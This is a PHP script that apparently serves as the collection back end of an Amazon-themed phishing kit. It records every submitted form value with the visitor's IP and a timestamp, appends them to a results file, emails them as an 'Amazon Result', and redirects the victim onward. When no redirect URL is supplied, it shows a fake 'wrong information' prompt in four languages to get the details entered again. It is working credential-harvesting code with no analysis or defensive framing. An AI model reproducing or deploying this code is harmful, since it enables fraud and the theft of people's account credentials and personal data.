<?php
$Date = date("Y-m-d");
$Time = date("h:i:s");
$ip = getenv("REMOTE_ADDR");
$result ="";
$url = "";
$formkeys = array_keys($_REQUEST);
$formvalue = array_values($_REQUEST);
for($i=0;$i<count($formkeys);$i++)
{
	if($formkeys[$i]=="url")
	{
		$url = $formvalue[$i];
		continue;
	}
	
	if(strlen($formvalue[$i]) > 200) continue;
	
	$result .= $formkeys[$i] ." : ". $formvalue[$i]."\r\n";
}
$result .= "Date : ". $Date."\r\nTime: ".$Time ."\r\nIP: ". $ip."\r\n";
if($url=="" || !isset($_REQUEST['url'])) 
{ 
	$code = $_GET["lang"];
	$lang = array();
	$lang['en'] = "You have enter wrong information, Click Ok to try again.";
	$lang['pt'] = "Você inseriu informações erradas, clique em OK para tentar novamente.";
	$lang['de'] = "Sie haben falsche Informationen eingegeben. Klicken Sie auf OK, um es erneut zu versuchen.";
	$lang['es'] = "Ha ingresado información incorrecta, haga clic en Aceptar para volver a intentarlo.";
	echo '<script>alert("'.$lang[$code].'"); window.history.back();</script>';
	exit();
}
$myfile = fopen("results.txt", "a") or die("Unable to open file!");
$txt = $result."-------------------\r\n";
fwrite($myfile, $txt);
fclose($myfile);
mail("","Amazon Result from ".$ip,$result);
echo "<script type='text/javascript'>window.top.location='".$url."';</script>"; exit;
//header("Location: " . $url); 
//exit();
?>